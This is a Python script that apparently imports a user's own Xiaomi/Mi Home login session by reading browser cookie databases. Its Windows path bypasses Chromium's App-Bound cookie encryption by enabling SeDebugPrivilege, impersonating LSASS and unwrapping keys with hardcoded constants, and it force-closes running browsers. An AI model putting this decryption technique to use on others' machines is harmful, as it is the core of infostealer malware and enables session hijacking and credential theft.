from __future__ import annotations

import argparse
import base64
import ctypes
import hashlib
import io
import json
import os
import shutil
import sqlite3
import struct
import subprocess
import sys
import tempfile
import time
from contextlib import contextmanager
from ctypes import wintypes
from dataclasses import dataclass
from pathlib import Path

import requests
from Crypto.Cipher import AES

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
except ImportError:  # v20 will be unavailable, v10/v11 can still work
    AESGCM = None
    ChaCha20Poly1305 = None

try:
    import windows
    import windows.crypto
    import windows.generated_def as gdef
except ImportError:  # v20 app-bound will be unavailable
    windows = None
    gdef = None


HERE = Path(__file__).resolve().parent
LOGIN_URL = (
    "https://account.xiaomi.com/pass/serviceLogin?"
    "sid=xiaomiio&_json=true&callback=https%3A%2F%2Fsts.api.io.mi.com%2Fsts"
)
COOKIE_NAMES = {"serviceToken", "userId", "cUserId", "passToken"}

# Chrome/Chromium App-Bound cookie master-key derivation constants seen in public v20 research.
# They are not Xiaomi-specific. Used only for decrypting cookies from the current Windows machine.
V20_AES_KEY_FLAG_1 = bytes.fromhex(
    "B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787"
)
V20_CHACHA20_KEY_FLAG_2 = bytes.fromhex(
    "E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660"
)
V20_XOR_KEY_FLAG_3 = bytes.fromhex(
    "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390"
)


@dataclass(frozen=True)
class BrowserSource:
    name: str
    kind: str
    root: Path


BROWSER_PROCESSES = {
    "brave": ("brave",),
    "chrome": ("chrome",),
    "chromium": ("chromium", "chrome"),
    "edge": ("msedge",),
    "firefox": ("firefox",),
    "opera": ("opera",),
    "opera gx": ("opera",),
    "tor browser": ("firefox",),
    "vivaldi": ("vivaldi",),
    "yandex": ("browser", "yandex_browser", "yandexbrowser"),
}


@dataclass(frozen=True)
class ChromiumKeys:
    legacy: bytes | None
    v20: bytes | None


class DataBlob(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]


def is_admin() -> bool:
    if os.name != "nt":
        return False
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def dpapi_decrypt(data: bytes) -> bytes:
    if os.name != "nt":
        raise RuntimeError("DPAPI decryption is available only on Windows")

    source = ctypes.create_string_buffer(data)
    source_blob = DataBlob(len(data), ctypes.cast(source, ctypes.POINTER(ctypes.c_char)))
    result_blob = DataBlob()

    if not ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(source_blob), None, None, None, None, 0, ctypes.byref(result_blob)
    ):
        raise ctypes.WinError()

    try:
        return ctypes.string_at(result_blob.pbData, result_blob.cbData)
    finally:
        ctypes.windll.kernel32.LocalFree(result_blob.pbData)


def require_v20_dependencies() -> None:
    missing = []
    if AESGCM is None or ChaCha20Poly1305 is None:
        missing.append("cryptography")
    if windows is None or gdef is None:
        missing.append("python-windows")
    if missing:
        raise RuntimeError(
            "v20/App-Bound support requires: " + ", ".join(missing) +
            ". Install: pip install cryptography python-windows"
        )
    if os.name != "nt":
        raise RuntimeError("v20/App-Bound support is Windows-only")
    if not is_admin():
        raise RuntimeError("v20/App-Bound support requires running the terminal as Administrator")


@contextmanager
def impersonate_lsass():
    """Temporarily impersonate LSASS to unwrap the system-bound part of Chrome's app-bound key."""
    require_v20_dependencies()
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next((p for p in windows.system.processes if p.name.lower() == "lsass.exe"), None)
        if proc is None:
            raise RuntimeError("lsass.exe process not found")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation,
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token


def parse_key_blob_candidates(blob_data: bytes) -> list[dict]:
    """
    Parse Chromium v20/App-Bound stage-2 blob.

    Chromium builds have used more than one wrapper layout around the final
    key material. The important inner layouts are currently:
      flag 1/2: flag(1) + iv(12) + ciphertext(32) + tag(16)
      flag 3:   flag(1) + encrypted_aes_key(32) + iv(12) + ciphertext(32) + tag(16)

    Older public snippets assume a leading length-prefixed header and read the
    flag at one fixed offset. On Edge/new Chromium this may read garbage such
    as 0xfc/252. This parser first tries the length-prefixed format, then scans
    for plausible embedded inner layouts and lets AEAD authentication validate
    the right candidate later.
    """
    candidates: list[dict] = []

    def add_candidate(offset: int) -> None:
        flag = blob_data[offset]
        if flag in (1, 2) and len(blob_data) >= offset + 61:
            base = offset + 1
            candidates.append({
                "offset": offset,
                "flag": flag,
                "iv": blob_data[base:base + 12],
                "ciphertext": blob_data[base + 12:base + 44],
                "tag": blob_data[base + 44:base + 60],
            })
        elif flag == 3 and len(blob_data) >= offset + 93:
            base = offset + 1
            candidates.append({
                "offset": offset,
                "flag": flag,
                "encrypted_aes_key": blob_data[base:base + 32],
                "iv": blob_data[base + 32:base + 44],
                "ciphertext": blob_data[base + 44:base + 76],
                "tag": blob_data[base + 76:base + 92],
            })

    # 1) Common length-prefixed wrapper: uint32 header_len, header, uint32 content_len, inner_blob.
    if len(blob_data) >= 9:
        try:
            header_len = struct.unpack("<I", blob_data[:4])[0]
            content_len_offset = 4 + header_len
            if 0 <= header_len <= len(blob_data) - 8 and content_len_offset + 4 <= len(blob_data):
                content_len = struct.unpack("<I", blob_data[content_len_offset:content_len_offset + 4])[0]
                inner_offset = content_len_offset + 4
                if inner_offset + content_len == len(blob_data):
                    add_candidate(inner_offset)
        except Exception:
            pass

    # 2) Direct inner blob starts at zero.
    if blob_data and blob_data[0] in (1, 2, 3):
        add_candidate(0)

    # 3) Fallback: scan for a plausible inner blob. Prefer candidates whose layout ends at EOF.
    for offset, byte in enumerate(blob_data):
        if byte not in (1, 2, 3):
            continue
        remaining = len(blob_data) - offset
        if (byte in (1, 2) and remaining >= 61) or (byte == 3 and remaining >= 93):
            add_candidate(offset)

    # Deduplicate while keeping order.
    unique: list[dict] = []
    seen: set[tuple[int, int]] = set()
    for item in candidates:
        key = (item["offset"], item["flag"])
        if key not in seen:
            seen.add(key)
            unique.append(item)

    if not unique:
        first = blob_data[0] if blob_data else None
        raise ValueError(f"no supported v20 key blob candidate found; len={len(blob_data)}, first_byte={first}")

    return unique


def parse_key_blob(blob_data: bytes) -> dict:
    """Compatibility wrapper: return first candidate only."""
    return parse_key_blob_candidates(blob_data)[0]


def decrypt_with_cng(input_data: bytes) -> bytes:
    require_v20_dependencies()
    ncrypt = ctypes.windll.NCRYPT

    h_provider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(h_provider), provider_name, 0)
    if status != 0:
        raise RuntimeError(f"NCryptOpenStorageProvider failed with status {status}")

    h_key = gdef.NCRYPT_KEY_HANDLE()
    key_name = "Google Chromekey1"
    try:
        status = ncrypt.NCryptOpenKey(h_provider, ctypes.byref(h_key), key_name, 0, 0)
        if status != 0:
            raise RuntimeError(f"NCryptOpenKey({key_name!r}) failed with status {status}")

        pcb_result = gdef.DWORD(0)
        input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)

        status = ncrypt.NCryptDecrypt(
            h_key,
            input_buffer,
            len(input_buffer),
            None,
            None,
            0,
            ctypes.byref(pcb_result),
            0x40,  # NCRYPT_SILENT_FLAG
        )
        if status != 0:
            raise RuntimeError(f"NCryptDecrypt(size) failed with status {status}")

        output_buffer = (ctypes.c_ubyte * pcb_result.value)()
        status = ncrypt.NCryptDecrypt(
            h_key,
            input_buffer,
            len(input_buffer),
            None,
            output_buffer,
            pcb_result.value,
            ctypes.byref(pcb_result),
            0x40,
        )
        if status != 0:
            raise RuntimeError(f"NCryptDecrypt(data) failed with status {status}")

        return bytes(output_buffer[: pcb_result.value])
    finally:
        if h_key:
            ncrypt.NCryptFreeObject(h_key)
        if h_provider:
            ncrypt.NCryptFreeObject(h_provider)


def byte_xor(left: bytes, right: bytes) -> bytes:
    return bytes(a ^ b for a, b in zip(left, right))


def derive_v20_master_key(parsed_data: dict) -> bytes:
    require_v20_dependencies()
    flag = parsed_data["flag"]

    if flag == 1:
        cipher = AESGCM(V20_AES_KEY_FLAG_1)
    elif flag == 2:
        cipher = ChaCha20Poly1305(V20_CHACHA20_KEY_FLAG_2)
    elif flag == 3:
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data["encrypted_aes_key"])
        cipher = AESGCM(byte_xor(decrypted_aes_key, V20_XOR_KEY_FLAG_3))
    else:
        raise ValueError(f"unsupported v20 key flag: {flag}")

    return cipher.decrypt(parsed_data["iv"], parsed_data["ciphertext"] + parsed_data["tag"], None)


def get_v20_master_key(local_state_path: Path, browser_name: str = "") -> bytes | None:
    """Return Chromium v20/App-Bound master key, or None if this browser does not use it.

    Chrome and Edge/Brave currently wrap the APPB key differently:
      * Edge/Brave: after SYSTEM DPAPI and USER DPAPI, the final 32 bytes are the AES-GCM cookie key.
      * Chrome: after both DPAPI layers, the inner key material still has to be unwrapped with
        the app-bound CNG/NCrypt + XOR/AES-GCM path.
    """
    local_state = json.loads(local_state_path.read_text(encoding="utf-8"))
    app_bound = local_state.get("os_crypt", {}).get("app_bound_encrypted_key")
    if not app_bound:
        return None

    require_v20_dependencies()

    key_blob_encrypted = base64.b64decode(app_bound)
    if not key_blob_encrypted.startswith(b"APPB"):
        raise RuntimeError("unsupported app_bound_encrypted_key format")

    key_blob_encrypted = key_blob_encrypted[4:]

    with impersonate_lsass():
        key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)

    key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)

    browser_lc = browser_name.lower()
    prefer_tail_key = any(name in browser_lc for name in ("edge", "brave"))

    # Edge/Brave: the final AES-GCM key is the last 32 bytes after both DPAPI layers.
    # Do this before the generic parser, otherwise random wrapper bytes can be misread
    # as a Chromium flag and produce misleading InvalidTag errors.
    if prefer_tail_key:
        if len(key_blob_user_decrypted) >= 32:
            print("  v20 Edge/Brave key mode: using last 32 bytes after SYSTEM+USER DPAPI")
            return key_blob_user_decrypted[-32:]
        raise RuntimeError(
            f"Edge/Brave v20 key blob is too short after DPAPI: {len(key_blob_user_decrypted)} bytes"
        )

    errors: list[str] = []
    for parsed in parse_key_blob_candidates(key_blob_user_decrypted):
        try:
            master_key = derive_v20_master_key(parsed)
            if len(master_key) in (16, 24, 32):
                print(f"  v20 Chrome key blob candidate accepted: flag={parsed['flag']} offset={parsed.get('offset')}")
                return master_key
            errors.append(f"flag={parsed['flag']} offset={parsed.get('offset')}: unexpected key length {len(master_key)}")
        except Exception as exc:
            errors.append(f"flag={parsed['flag']} offset={parsed.get('offset')}: {type(exc).__name__}: {exc}")

    # Non-Chrome Chromium builds sometimes match the Edge/Brave layout but have a
    # different product name. Keep this as a last-resort fallback, not for Chrome.
    if "chrome" not in browser_lc and len(key_blob_user_decrypted) >= 32:
        print("  v20 fallback key mode: using last 32 bytes after SYSTEM+USER DPAPI")
        return key_blob_user_decrypted[-32:]

    raise RuntimeError("all v20 key blob candidates failed; " + " | ".join(errors[:8]))


def chromium_keys(root: Path, *, enable_v20: bool = True, browser_name: str = "") -> ChromiumKeys:
    state_file = root / "Local State"
    if not state_file.is_file():
        raise RuntimeError(f"Local State not found: {state_file}")

    state = json.loads(state_file.read_text(encoding="utf-8"))
    encrypted_key = state.get("os_crypt", {}).get("encrypted_key")

    legacy: bytes | None = None
    if encrypted_key:
        encrypted = base64.b64decode(encrypted_key)
        if encrypted.startswith(b"DPAPI"):
            legacy = dpapi_decrypt(encrypted[5:])
        elif encrypted.startswith(b"APPB"):
            legacy = None
        else:
            raise RuntimeError("unsupported Chromium os_crypt.encrypted_key format")

    v20: bytes | None = None
    if enable_v20 and state.get("os_crypt", {}).get("app_bound_encrypted_key"):
        v20 = get_v20_master_key(state_file, browser_name=browser_name)

    return ChromiumKeys(legacy=legacy, v20=v20)


def decrypt_chromium_cookie(encrypted: bytes, keys: ChromiumKeys, host: str) -> str:
    if encrypted.startswith((b"v10", b"v11")):
        if keys.legacy is None:
            raise RuntimeError("legacy Chromium key is not available")
        nonce, payload = encrypted[3:15], encrypted[15:]
        plain = AES.new(keys.legacy, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(
            payload[:-16], payload[-16:]
        )
    elif encrypted.startswith(b"v20"):
        if keys.v20 is None:
            raise RuntimeError("v20/App-Bound Chromium key is not available")
        nonce = encrypted[3:15]
        payload = encrypted[15:-16]
        tag = encrypted[-16:]
        plain = AES.new(keys.v20, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(payload, tag)
    else:
        plain = dpapi_decrypt(encrypted)

    # Chromium may prefix plaintext with SHA256(host_key).
    digest = hashlib.sha256(host.encode()).digest()
    if plain.startswith(digest):
        plain = plain[len(digest):]

    return plain.decode("utf-8")


def default_sources_windows() -> list[BrowserSource]:
    local = Path(os.environ.get("LOCALAPPDATA", ""))
    roaming = Path(os.environ.get("APPDATA", ""))
    home = Path.home()
    candidates = [
        BrowserSource("Chrome", "chromium", local / "Google/Chrome/User Data"),
        BrowserSource("Firefox", "firefox", roaming / "Mozilla/Firefox/Profiles"),
        BrowserSource("Edge", "chromium", local / "Microsoft/Edge/User Data"),
        BrowserSource("Yandex", "chromium", local / "Yandex/YandexBrowser/User Data"),
        BrowserSource("Chromium", "chromium", local / "Chromium/User Data"),
        BrowserSource("Brave", "chromium", local / "BraveSoftware/Brave-Browser/User Data"),
        BrowserSource("Vivaldi", "chromium", local / "Vivaldi/User Data"),
        BrowserSource("Opera", "chromium", roaming / "Opera Software/Opera Stable"),
        BrowserSource("Opera GX", "chromium", roaming / "Opera Software/Opera GX Stable"),
        BrowserSource("Tor Browser", "firefox", home / "Desktop/Tor Browser/Browser/TorBrowser/Data/Browser"),
    ]
    return [source for source in candidates if source.root.is_dir()]


def default_sources_linux() -> list[BrowserSource]:
    home = Path.home()
    candidates = [
        BrowserSource("Chrome", "chromium", home / ".config/google-chrome"),
        BrowserSource("Chromium", "chromium", home / ".config/chromium"),
        BrowserSource("Firefox", "firefox", home / ".mozilla/firefox"),
        BrowserSource("Brave", "chromium", home / ".config/BraveSoftware/Brave-Browser"),
        BrowserSource("Vivaldi", "chromium", home / ".config/vivaldi"),
        BrowserSource("Opera", "chromium", home / ".config/opera"),
        BrowserSource("Yandex", "chromium", home / ".config/yandex-browser"),
    ]
    return [source for source in candidates if source.root.is_dir()]


def default_sources_macos() -> list[BrowserSource]:
    home = Path.home()
    candidates = [
        BrowserSource("Chrome", "chromium", home / "Library/Application Support/Google/Chrome"),
        BrowserSource("Chromium", "chromium", home / "Library/Application Support/Chromium"),
        BrowserSource("Firefox", "firefox", home / "Library/Application Support/Firefox/Profiles"),
        BrowserSource("Brave", "chromium", home / "Library/Application Support/BraveSoftware/Brave-Browser"),
        BrowserSource("Vivaldi", "chromium", home / "Library/Application Support/Vivaldi"),
        BrowserSource("Opera", "chromium", home / "Library/Application Support/Opera"),
    ]
    return [source for source in candidates if source.root.is_dir()]


def default_sources() -> list[BrowserSource]:
    if os.name == "nt":
        return default_sources_windows()
    if sys.platform == "linux":
        return default_sources_linux()
    if sys.platform == "darwin":
        return default_sources_macos()
    raise RuntimeError(f"unsupported platform: {sys.platform}")


def process_names_for_source(source: BrowserSource) -> tuple[str, ...]:
    name = source.name.lower()
    for browser_name, process_names in BROWSER_PROCESSES.items():
        if browser_name in name:
            return process_names
    if source.kind == "firefox":
        return ("firefox",)
    if source.kind == "chromium":
        return ("chrome", "chromium")
    return ()


def powershell_array(values: set[str]) -> str:
    return "@(" + ",".join("'" + value.replace("'", "''") + "'" for value in sorted(values)) + ")"


def close_browser_processes(sources: list[BrowserSource]) -> None:
    process_names = {
        process_name
        for source in sources
        for process_name in process_names_for_source(source)
        if process_name
    }
    if not process_names:
        return

    print("Closing browser processes: " + ", ".join(sorted(process_names)))
    try:
        if os.name == "nt":
            script = (
                "$names = " + powershell_array(process_names) + "; "
                "$procs = Get-Process -Name $names -ErrorAction SilentlyContinue; "
                "if ($procs) { "
                "$procs | Where-Object { $_.MainWindowHandle -ne 0 } | ForEach-Object { [void]$_.CloseMainWindow() }; "
                "Start-Sleep -Seconds 2; "
                "$procs | Where-Object { -not $_.HasExited } | Stop-Process -Force; "
                "$procs | Select-Object -ExpandProperty ProcessName -Unique "
                "}"
            )
            completed = subprocess.run(
                ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script],
                capture_output=True,
                text=True,
                check=False,
            )
        elif sys.platform == "darwin":
            closed = []
            for process_name in sorted(process_names):
                result = subprocess.run(
                    ["pkill", "-TERM", "-x", process_name],
                    capture_output=True,
                    text=True,
                    check=False,
                )
                if result.returncode == 0:
                    closed.append(process_name)
            time.sleep(2)
            for process_name in sorted(process_names):
                subprocess.run(["pkill", "-KILL", "-x", process_name], capture_output=True, check=False)
            completed = subprocess.CompletedProcess([], 0, stdout="\n".join(closed), stderr="")
        else:
            closed = []
            for process_name in sorted(process_names):
                result = subprocess.run(
                    ["pkill", "-TERM", "-x", process_name],
                    capture_output=True,
                    text=True,
                    check=False,
                )
                if result.returncode == 0:
                    closed.append(process_name)
            time.sleep(2)
            for process_name in sorted(process_names):
                subprocess.run(["pkill", "-KILL", "-x", process_name], capture_output=True, check=False)
            completed = subprocess.CompletedProcess([], 0, stdout="\n".join(closed), stderr="")

        closed = (completed.stdout or "").strip()
        if closed:
            print("Closed: " + ", ".join(dict.fromkeys(closed.split())))
    except FileNotFoundError:
        print("  process closer is unavailable on this system")
    except Exception as exc:
        print(f"  failed to close browsers automatically: {type(exc).__name__}: {exc}")


def profiles(source: BrowserSource) -> list[Path]:
    if source.kind == "firefox":
        found = []
        if source.root.is_dir():
            found.extend(path for path in source.root.iterdir() if (path / "cookies.sqlite").is_file())
        if (source.root / "cookies.sqlite").is_file():
            found.insert(0, source.root)
        return list(dict.fromkeys(found))

    found: list[Path] = []
    if (source.root / "Network/Cookies").is_file():
        found.append(source.root)

    if source.root.is_dir():
        found.extend(
            path
            for path in source.root.iterdir()
            if path.is_dir()
            and (path.name == "Default" or path.name.startswith("Profile "))
            and (path / "Network/Cookies").is_file()
        )

    return list(dict.fromkeys(found))


def open_snapshot(database: Path) -> tuple[sqlite3.Connection, tempfile.TemporaryDirectory]:
    temporary = tempfile.TemporaryDirectory(prefix="xiaomi-browser-cookies-")
    snapshot = Path(temporary.name) / database.name
    try:
        shutil.copy2(database, snapshot)
        for suffix in ("-wal", "-shm"):
            companion = database.with_name(database.name + suffix)
            if companion.is_file():
                shutil.copy2(companion, snapshot.with_name(snapshot.name + suffix))
        return sqlite3.connect(snapshot, timeout=5), temporary
    except sqlite3.OperationalError as exc:
        temporary.cleanup()
        raise RuntimeError("Закройте браузер и повторите попытку.") from exc
    except OSError as exc:
        temporary.cleanup()
        raise RuntimeError("Закройте браузер и повторите попытку.") from exc


def chromium_cookies(profile: Path, keys: ChromiumKeys) -> list[dict]:
    connection, temporary = open_snapshot(profile / "Network/Cookies")
    try:
        rows = connection.execute(
            "select host_key,name,path,value,encrypted_value from cookies "
            "where host_key like '%xiaomi%' or host_key like '%mi.com%'"
        ).fetchall()
    finally:
        connection.close()
        temporary.cleanup()

    result = []
    failed = 0

    for host, name, path, value, encrypted in rows:
        if name not in COOKIE_NAMES:
            continue
        try:
            if not value:
                value = decrypt_chromium_cookie(bytes(encrypted), keys, host)
        except Exception as exc:
            failed += 1
            print(f"  cookie {name}@{host}: {type(exc).__name__}: {exc}")
            continue

        if value:
            result.append({"domain": host, "name": name, "path": path or "/", "value": value})

    if failed:
        print(f"  failed to decrypt {failed} Chromium Xiaomi cookie(s)")

    return result


def firefox_cookies(profile: Path) -> list[dict]:
    connection, temporary = open_snapshot(profile / "cookies.sqlite")
    try:
        rows = connection.execute(
            "select host,name,path,value from moz_cookies "
            "where host like '%xiaomi%' or host like '%mi.com%'"
        ).fetchall()
    finally:
        connection.close()
        temporary.cleanup()

    return [
        {"domain": host, "name": name, "path": path or "/", "value": value}
        for host, name, path, value in rows
        if name in COOKIE_NAMES and value
    ]


def cookie_value(session: requests.Session, name: str) -> str | None:
    return next((cookie.value for cookie in session.cookies if cookie.name == name), None)


def exchange(cookies: list[dict], method: str) -> dict | None:
    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0"

    for cookie in cookies:
        session.cookies.set(cookie["name"], cookie["value"], domain=cookie["domain"], path=cookie["path"])

    response = session.get(LOGIN_URL, timeout=30)
    response.raise_for_status()
    data = json.loads(response.text.replace("&&&START&&&", ""))

    if data.get("location"):
        session.get(data["location"], timeout=30).raise_for_status()

    result = {
        "user_id": str(data.get("userId") or cookie_value(session, "userId") or ""),
        "cuser_id": data.get("cUserId") or cookie_value(session, "cUserId"),
        "pass_token": data.get("passToken") or cookie_value(session, "passToken"),
        "ssecurity": data.get("ssecurity"),
        "service_token": cookie_value(session, "serviceToken"),
        "created_at": int(time.time()),
        "auth_method": method,
    }

    return result if all(result.get(key) for key in ("user_id", "ssecurity", "service_token")) else None


def read_cookies_for_source(source: BrowserSource, profile: Path, keys: ChromiumKeys | None) -> list[dict]:
    if source.kind == "chromium":
        if keys is None:
            raise RuntimeError("Chromium keys were not initialized")
        return chromium_cookies(profile, keys)
    return firefox_cookies(profile)


def main() -> int:
    parser = argparse.ArgumentParser(description="Import an existing Xiaomi browser session")
    parser.add_argument("--browser", help="Installed browser name filter, for example Chrome, Edge, Yandex or Firefox")
    parser.add_argument("--profile", type=Path, help="Custom Chromium/Firefox profile path")
    parser.add_argument("--kind", choices=("chromium", "firefox"), default="chromium")
    parser.add_argument("--output", type=Path, default=HERE / "state/cloud_auth.json")
    parser.add_argument(
        "--no-v20",
        action="store_true",
        help="Disable Chromium v20/App-Bound key extraction and only try legacy v10/v11 cookies",
    )
    parser.add_argument(
        "--no-close-browsers",
        action="store_true",
        help="Do not close running browsers before reading cookie databases",
    )
    args = parser.parse_args()

    sources = default_sources()

    if args.profile:
        root = args.profile.expanduser().resolve()
        sources = [BrowserSource("Custom", args.kind, root)]
    elif args.browser:
        sources = [source for source in sources if args.browser.lower() in source.name.lower()]

    if not sources:
        raise RuntimeError("no matching browser profile was found")

    print("Browser search order: " + " -> ".join(source.name for source in sources))
    if not args.no_close_browsers:
        close_browser_processes(sources)

    for source in sources:
        print(f"Checking {source.name}: {source.root}")
        try:
            keys = None
            if source.kind == "chromium":
                keys = chromium_keys(source.root, enable_v20=not args.no_v20, browser_name=source.name)
                print(
                    "  Chromium keys: "
                    f"legacy={'yes' if keys.legacy else 'no'}, "
                    f"v20={'yes' if keys.v20 else 'no'}"
                )

            profile_list = profiles(source)
            if not profile_list:
                print(f"{source.name}: no browser profiles with cookies found")
                continue

            for profile in profile_list:
                print(f"  profile: {profile}")
                cookies = read_cookies_for_source(source, profile, keys)
                if not cookies:
                    continue

                result = exchange(cookies, f"existing-{source.name.lower().replace(' ', '-')}-session")
                if result:
                    args.output.parent.mkdir(parents=True, exist_ok=True)
                    args.output.write_text(json.dumps(result, ensure_ascii=False, indent=2), encoding="utf-8")
                    try:
                        os.chmod(args.output, 0o600)
                    except OSError:
                        pass
                    print(f"Complete Xiaomi session imported from {source.name}: {args.output}")
                    return 0

            print(f"{source.name}: no complete Mi Home credentials in existing session")

        except Exception as exc:
            print(f"{source.name}: {type(exc).__name__}: {exc}", file=sys.stderr)

    raise RuntimeError("Не получены необходимые данные.")


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        print(f"IMPORT ERROR: {type(exc).__name__}: {exc}", file=sys.stderr)
        raise SystemExit(1)
